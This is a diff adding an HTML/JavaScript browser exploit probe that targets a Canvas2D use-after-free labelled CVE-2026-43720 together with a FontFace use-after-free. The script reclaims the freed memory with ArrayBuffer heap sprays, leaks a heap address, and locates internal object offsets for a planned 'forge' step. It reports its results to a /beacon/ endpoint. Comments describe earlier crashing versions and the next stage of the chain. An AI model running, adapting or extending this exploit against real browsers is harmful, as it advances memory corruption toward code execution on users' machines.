@@ -1,0 +1,269 @@
+<!--
+  p649c: Canvas2D m_unrealizedSaveCount offset discovery via ZERO-fill spray
+
+  p649 crashed: renderer touched corrupted canvas in DOM → fixed by detach
+  p649b crashed: save() hit m_callTracingActive != 0 in {T,1|1} pattern
+                 → Inspector branch dereferences canvasBase() garbage → crash
+
+  Fix: spray AB(768) with ALL ZEROS.
+    - m_callTracingActive = 0 → inspector branch skipped
+    - m_unrealizedSaveCount = 0 → save() increments it 0→1→...→10
+    - Scan ABs for dword == 10 → exact offset
+    - DON'T read properties (m_stateStack.m_buffer=NULL → crash on getter)
+
+  This is a discovery-only probe. Next probe uses the offset for targeted forge.
+
+  CRASH_CLASS: MODERATE — UAF with zero-fill, no pointer dereferences expected
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p649c</title></head>
+<body>p649c: save() offset discovery (zero-fill)
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+var retained = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 3) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 6).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P649C-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', navigator.userAgent ? navigator.userAgent.slice(0,60) : 'no-ua');
+flush();
+
+// ================================================================
+// PHASE 1: FontFace UAF → leak heap address (for next probe)
+// ================================================================
+var ffA = new FontFace('ff0', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+document.fonts.add(ffA);
+void ffA.loaded;
+retained.push(ffA);
+
+var ffStyle = document.createElement('style');
+ffStyle.textContent = "@font-face { font-family: ffs0; src: local(Arial); unicode-range: U+0042; }";
+document.head.appendChild(ffStyle);
+
+var ffFired = false;
+var ffBufs = [];
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (ffFired) return undefined;
+    ffFired = true;
+    ffStyle.remove();
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+    for (var i = 0; i < 64; i++) {
+      var ab = new ArrayBuffer(192);
+      ffBufs.push(new Uint8Array(ab));
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+document.fonts.load('1em ff0, ffs0', 'AB');
+
+setTimeout(function() {
+try {
+  var T_lo = 0, T_hi = 0;
+  var ffHit = -1;
+
+  for (var i = 0; i < ffBufs.length; i++) {
+    var v = ffBufs[i];
+    var nonzero = 0;
+    for (var j = 0; j < 192; j++) if (v[j] !== 0) nonzero++;
+    if (nonzero > 0) {
+      ffHit = i;
+      var dv = new DataView(v.buffer);
+      T_lo = dv.getUint32(0x58, true);
+      T_hi = dv.getUint32(0x5C, true);
+      emit('FF-HIT', 'buf[' + i + '] nz=' + nonzero + ' T=0x' + hex32(T_hi) + hex32(T_lo));
+      break;
+    }
+  }
+  if (ffHit < 0) emit('FF-MISS', 'no reclaim');
+  flush();
+
+  // ================================================================
+  // PHASE 2: Canvas2D UAF (CVE-2026-43720) — DETACHED canvas
+  // ================================================================
+  var uafCanvas = document.createElement('canvas');
+  uafCanvas.width = 1; uafCanvas.height = 1;
+  // NOT in DOM — prevents renderer from touching corrupted context
+
+  var innerCtx = null;
+  var gFired = false;
+  var cvOpts = {};
+  Object.defineProperty(cvOpts, 'alpha', {
+    get: function() {
+      gFired = true;
+      innerCtx = uafCanvas.getContext('2d');
+      return true;
+    }
+  });
+
+  try { uafCanvas.getContext('bitmaprenderer', cvOpts); } catch(e) {}
+
+  emit('CV-UAF', 'getter=' + gFired + ' inner=' + !!innerCtx);
+  flush();
+  if (!innerCtx) { emit('ABORT', 'no inner ctx'); flush(); return; }
+
+  // ================================================================
+  // PHASE 3: AB(768) spray — ALL ZEROS (ArrayBuffer initializes to 0)
+  // This ensures m_callTracingActive = 0 → save() skips inspector branch
+  // ================================================================
+  var AB_N = 300;
+  var abDVs = [];
+
+  for (var i = 0; i < AB_N; i++) {
+    var ab = new ArrayBuffer(768);
+    abDVs.push(new DataView(ab));
+    retained.push(ab);
+  }
+
+  emit('SPRAY', AB_N + ' AB(768) zero-fill');
+  flush();
+
+  // ================================================================
+  // PHASE 4: save() × N — find m_unrealizedSaveCount offset
+  // With zero-fill:
+  //   m_callTracingActive = 0 → inspector skipped
+  //   m_unrealizedSaveCount starts at 0, incremented to SAVE_N
+  // ================================================================
+  emit('PRE-SAVE', 'calling save() x10...');
+  flush();
+
+  var SAVE_N = 10;
+  for (var si = 0; si < SAVE_N; si++) {
+    innerCtx.save();
+  }
+
+  emit('SAVE-OK', 'save() x' + SAVE_N + ' survived!');
+  flush();
+
+  // Scan for dword == SAVE_N (all ABs start as zeros, so any == 10 is the hit)
+  var hitAB = -1;
+  var hitOff = -1;
+  var falseHits = 0;
+
+  for (var ai = 0; ai < abDVs.length; ai++) {
+    for (var off = 0; off < 768; off += 4) {
+      var val = abDVs[ai].getUint32(off, true);
+      if (val === SAVE_N) {
+        if (hitAB < 0) {
+          hitAB = ai;
+          hitOff = off;
+          emit('SAVE-HIT', 'AB[' + ai + ']+0x' + off.toString(16) + ' == ' + SAVE_N);
+        } else {
+          falseHits++;
+        }
+      }
+    }
+  }
+
+  if (hitAB < 0) {
+    emit('SAVE-MISS', 'no dword==' + SAVE_N + ' found');
+    // Check for ANY non-zero dword in any AB
+    var anyNZ = 0;
+    for (var ai = 0; ai < abDVs.length && anyNZ < 10; ai++) {
+      for (var off = 0; off < 768; off += 4) {
+        var val = abDVs[ai].getUint32(off, true);
+        if (val !== 0) {
+          emit('NZ', 'AB[' + ai + ']+0x' + off.toString(16) + '=0x' + hex32(val));
+          anyNZ++;
+          if (anyNZ >= 10) break;
+        }
+      }
+    }
+    if (anyNZ === 0) emit('NZ', 'ALL ABs still zero — no reclaim?');
+  } else {
+    emit('SAVE-OK2', 'offset=0x' + hitOff.toString(16) + ' falseHits=' + falseHits);
+
+    // Verify: do 5 more saves, check increment
+    for (var si2 = 0; si2 < 5; si2++) {
+      innerCtx.save();
+    }
+    var newVal = abDVs[hitAB].getUint32(hitOff, true);
+    emit('VERIFY', 'after +5 more: val=' + newVal + ' (expect ' + (SAVE_N + 5) + ')');
+
+    // Dump the hit AB — first 0x120 bytes
+    var hitU8 = new Uint8Array(abDVs[hitAB].buffer);
+    for (var row = 0; row < 0x120; row += 32) {
+      var hex = '';
+      var hasData = false;
+      for (var j = 0; j < 32 && row + j < 768; j++) {
+        hex += ('0' + hitU8[row + j].toString(16)).slice(-2);
+        if (hitU8[row + j] !== 0) hasData = true;
+      }
+      if (hasData || (row <= hitOff && hitOff < row + 32)) {
+        var mark = '';
+        if (row <= hitOff && hitOff < row + 32) mark = ' <-- saveCount+0x' + hitOff.toString(16);
+        emit('DUMP', '+0x' + ('000' + row.toString(16)).slice(-3) + ': ' + hex + mark);
+      }
+    }
+
+    // Also dump around hitOff if past 0x120
+    if (hitOff >= 0x120) {
+      var base = hitOff - (hitOff % 32) - 32;
+      for (var row = base; row < hitOff + 64 && row < 768; row += 32) {
+        var hex = '';
+        for (var j = 0; j < 32 && row + j < 768; j++) {
+          hex += ('0' + hitU8[row + j].toString(16)).slice(-2);
+        }
+        var mark = '';
+        if (row <= hitOff && hitOff < row + 32) mark = ' <-- saveCount+0x' + hitOff.toString(16);
+        emit('DUMP', '+0x' + ('000' + row.toString(16)).slice(-3) + ': ' + hex + mark);
+      }
+    }
+    flush();
+
+    // Scan for ALL non-zero bytes in the hit AB
+    var nzList = [];
+    for (var off = 0; off < 768; off++) {
+      if (hitU8[off] !== 0) nzList.push(off);
+    }
+    emit('NZ-MAP', nzList.length + ' non-zero bytes: ' +
+      nzList.slice(0, 24).map(function(o) { return '0x'+o.toString(16); }).join(',') +
+      (nzList.length > 24 ? '...' : ''));
+    flush();
+
+    // Layout estimates
+    emit('LAYOUT', '=== OFFSET MAP ===');
+    emit('LAYOUT', 'm_unrealizedSaveCount: +0x' + hitOff.toString(16));
+    // m_callTracingActive is immediately after (1 byte)
+    emit('LAYOUT', 'm_callTracingActive (est): +0x' + (hitOff + 4).toString(16));
+    // m_dirtyRect (FloatRect 16B) is before m_unrealizedSaveCount
+    var dro = hitOff - 16;
+    emit('LAYOUT', 'm_dirtyRect (est): +0x' + dro.toString(16));
+    // m_stateStack Vector ends at m_dirtyRect
+    // Vector<State,1> header is 16B at start
+    // Inline State right after header
+    // lineWidth = stateStack_start + 0x10 + 0x30 = stateStack_start + 0x40
+    // We don't know stateStack_start yet, but we know it ends at dro
+    emit('LAYOUT', 'stateStack ends at: +0x' + dro.toString(16));
+    emit('LAYOUT', 'For next probe: need stateStack_start to compute lineWidth offset');
+    emit('LAYOUT', 'FontFace T for forge: 0x' + hex32(T_hi) + hex32(T_lo));
+    flush();
+  }
+
+  emit('ALIVE', 'probe complete');
+  flush();
+
+} catch(topErr) { emit('FATAL', String(topErr).slice(0,200)); flush(); }
+}, 250);
+})();
+</script>
+</body></html>
